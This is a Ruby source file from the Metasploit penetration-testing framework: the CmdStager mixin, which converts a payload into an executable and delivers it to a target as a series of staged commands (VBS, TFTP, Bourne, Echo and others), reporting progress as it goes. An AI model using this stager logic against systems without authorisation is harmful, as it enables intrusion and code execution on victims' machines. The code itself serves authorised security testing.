# -*- coding: binary -*-

require 'rex/exploitation/cmdstager'
require 'msf/core/exploit/exe'

# The various CmdStager exploit mixins
require 'msf/core/exploit/cmdstager/vbs'
require 'msf/core/exploit/cmdstager/adodb'
require 'msf/core/exploit/cmdstager/debugwrite'
require 'msf/core/exploit/cmdstager/debugasm'
require 'msf/core/exploit/cmdstager/tftp'
require 'msf/core/exploit/cmdstager/bourne'
require 'msf/core/exploit/cmdstager/echo'


module Msf

###
#
# This mixin provides an interface to generating cmdstagers
#
###
module Exploit::CmdStager

  include Msf::Exploit::EXE

  #
  # This is all of the valid CmdStagers
  #
  SUPPORTED_CMD_STAGERS = [
    'VBS',
    'ADODB',
    'DebugWrite',
    'DebugAsm',
    'TFTP',
    'Bourne',
    'Echo'
  ]

  #
  # Creates an instance of an exploit that uses an CmdStager overwrite.
  #
  def initialize(info = {})
    super

    register_options(
      [
        OptString.new('CmdStager', [ true, "The flavor of CmdStager to use", 'vbs' ]),
      ], self.class
    )

    @cmd_list = nil
    @stager_instance = nil
    @stager_extended = nil
  end


  #
  # Called when someone does "set cmdstager"
  #
  def cmdstager_validate(value)
    val = value.downcase

    # is it one of the supported CmdStagers ?
    return false if not SUPPORTED_CMD_STAGERS.map { |e| e.downcase }.include? val

    #
    # NOTE: undoing the extension is not possible. This may lead to some
    # unexpected behavior. For example, switching between CmdStager settings 
    # multiple time may not behave correctly.
    #
    if @stager_extended and @stager_extended != val
      print_error("CmdStager can only be assigned once. Try 'back' then 'use' again.")
      return false
    end

    case val
      when 'vbs'
        extend Msf::Exploit::CmdStager::VBS

      when 'adodb'
        extend Msf::Exploit::CmdStager::ADODB

      when 'debugwrite'
        extend Msf::Exploit::CmdStager::DebugWrite

      when 'debugasm'
        extend Msf::Exploit::CmdStager::DebugAsm

      when 'tftp'
        extend Msf::Exploit::CmdStager::TFTP

      when 'bourne'
        extend Msf::Exploit::CmdStager::Bourne

      when 'echo'
        extend Msf::Exploit::CmdStager::Echo

      else
        return false

    end

    @stager_extended = val
    true
  end


  #
  # Execute the command stager while showing the progress
  #
  def execute_cmdstager(opts = {})
    cmd_list = generate_cmdstager(opts)

    execute_cmdstager_begin(opts)

    sent = 0
    total_bytes = 0
    cmd_list.each { |cmd| total_bytes += cmd.length }

    delay = opts[:delay]
    delay ||= 0.25

    cmd_list.each do |cmd|
      execute_command(cmd, opts)
      sent += cmd.length

      # In cases where a server has multiple threads, we want to be sure that
      # commands we execute happen in the correct (serial) order.
      ::IO.select(nil, nil, nil, delay)

      progress(total_bytes, sent)
    end

    execute_cmdstager_end(opts)
  end


  #
  # Generates a cmd stub based on the current target's architecture
  # and operating system.
  #
  def generate_cmdstager(opts = {}, pl = nil)
    pl ||= payload.encoded

    @exe = generate_payload_exe

    @stager_instance = create_stager(@exe)
    cmd_list = @stager_instance.generate(opts)

    if (cmd_list.nil? or cmd_list.length < 1)
      print_error("The command stager could not be generated")
      raise ArgumentError
    end

    @cmd_list = cmd_list
  end


  #
  # Show the progress of the upload
  #
  def progress(total, sent)
    done = (sent.to_f / total.to_f) * 100
    percent = "%3.2f%%" % done.to_f
    print_status("Command Stager progress - %7s done (%d/%d bytes)" % [percent, sent, total])
  end

  #
  # Methods to override - not used internally
  #
  def execute_cmdstager_begin(opts)
  end
  def execute_cmdstager_end(opts)
  end

end

end
